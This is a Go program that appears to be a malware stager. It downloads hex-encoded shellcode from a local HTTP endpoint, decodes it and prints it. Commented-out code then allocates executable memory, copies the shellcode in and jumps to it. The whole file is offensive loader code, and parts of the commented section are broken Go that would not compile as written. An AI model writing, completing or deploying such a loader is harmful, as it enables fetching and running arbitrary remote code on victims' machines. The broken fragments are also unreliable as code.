package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

func main() {
	url := "http://localhost:80/shell_hex"
	fmt.Printf("[+] Fetching shellcode from %s ...\n", url)
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("[-] HTTP Request failed. Error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("[-] Unexpected HTTP Status: %d", resp.StatusCode)
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("[-] Failed to read response body: %v", err)
	}

	code_hex := strings.TrimSpace(string(bodyBytes))
	fmt.Printf("Shell code hex is: %s\n", code_hex)

	// Remove "0x" prefixes or commas if your hex file format uses them (e.g., 0xde, 0xad)
	code_hex = strings.ReplaceAll(code_hex, "0x", "")
	code_hex = strings.ReplaceAll(code_hex, ",", "")
	code_hex = strings.ReplaceAll(code_hex, "\\x", "") // Handles \x90\x90 format
	code_hex = strings.ReplaceAll(code_hex, "\n", "")
	code_hex = strings.ReplaceAll(code_hex, " ", "")

	shellcode, err := hex.DecodeString(code_hex)
	if err != nil {
		log.Fatalf("Failed to decode shellcode : %v", err)
	}
	fmt.Printf("Shellcode is decoded. Byte Length: %d\n", len(shellcode))
	fmt.Printf("Shellcod is : %s", shellcode)

	// rwxMem, err := syscall.Mmap(-1, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON|syscall.MAP_PRIVATE)
	// if err != nil {
	// 	log.Fatalf("[-] Mmap allocation failed: %v", err)
	// }

	// var memSlice []byte
	// header := (*sliceHeader)(unsafe.pointer(&memSlice))
	// header.Data = rwxMem
	// header.Len = len(shellcode)
	// header.Cap = len(shellcode)

	// copy(rwxMem, shellcode)

	// type funcval struct {
	// 	fn uintptr
	// }
	// fv := funcval{fn: uintptr(unsafe.Pointer(&rwxMem[0]))}
	// f := *(*func())(unsafe.Pointer(&fv))
	// f()

	// codeAddr := uintptr(unsafe.Pointer(&rwxMem[0]))
	// shellcodeFunc := *(*func())(unsafe.Pointer(&codeAddr))
	// shellcodeFunc()
}
